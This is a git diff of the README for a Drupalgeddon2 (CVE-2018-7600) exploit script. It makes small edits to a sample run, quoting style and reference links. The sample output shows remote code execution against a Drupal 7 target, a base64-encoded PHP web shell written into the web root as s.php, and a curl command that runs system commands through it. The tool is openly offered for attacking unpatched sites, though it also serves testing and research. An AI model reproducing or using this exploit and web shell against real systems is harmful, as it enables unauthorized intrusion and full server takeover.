@@ -77,12 +77,12 @@ $ ./drupalgeddon2.rb http://localhost/drupal-7/
 [*] Testing: Code Execution
 [*] Payload: echo FLUBCTEZ
 [+] Result : FLUBCTEZ
-[{"command":"settings","settings":{"basePath":"\/drupal-7.55\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"bSQXTLxvuTsh1M_vGKQog3Rp7ZAA-o8-PBVy0RpC5NY"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"","settings":{"basePath":"\/drupal-7.55\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"bSQXTLxvuTsh1M_vGKQog3Rp7ZAA-o8-PBVy0RpC5NY"}}}]
+[{"command":"settings","settings":{"basePath":"\/drupal-7\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"bSQXTLxvuTsh1M_vGKQog3Rp7ZAA-o8-PBVy0RpC5NY"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"","settings":{"basePath":"\/drupal-7\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"bSQXTLxvuTsh1M_vGKQog3Rp7ZAA-o8-PBVy0RpC5NY"}}}]
 [+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
 --------------------------------------------------------------------------------
 [*] Testing: File Write To Web Root (./)
 [*] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee ./s.php
-[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }[{"command":"settings","settings":{"basePath":"\/drupal-7.55\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"5RvOux65dtisVX7T9EwnBxXhyvSdeNhX0njFg3ha_rc"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"","settings":{"basePath":"\/drupal-7.55\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"5RvOux65dtisVX7T9EwnBxXhyvSdeNhX0njFg3ha_rc"}}}]
+[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }[{"command":"settings","settings":{"basePath":"\/drupal-7\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"5RvOux65dtisVX7T9EwnBxXhyvSdeNhX0njFg3ha_rc"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"","settings":{"basePath":"\/drupal-7\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"5RvOux65dtisVX7T9EwnBxXhyvSdeNhX0njFg3ha_rc"}}}]
 [+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
 --------------------------------------------------------------------------------
 [*] Fake shell:   curl 'http://localhost/drupal-7/s.php' -d 'c=whoami'
@@ -109,7 +109,7 @@ writeshell = true
 For proxy support _(e.g. Burp)_, edit the file, replacing with your values. Example:
 
 ```ruby
-proxy_addr = '192.168.0.130'
+proxy_addr = "192.168.0.130"
 proxy_port = 8080
 ```
 
@@ -130,5 +130,5 @@ proxy_port = 8080
 
 - **Write up & Research** ~ https://research.checkpoint.com/uncovering-drupalgeddon-2/
 - Drupal SA-CORE-2018-002 Advisory ~ https://www.drupal.org/sa-core-2018-002
-- cURL commands ~ https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708
+- cURL commands/sample/PoC ~ https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708
 - CVE ~ https://nvd.nist.gov/vuln/detail/CVE-2018-7600
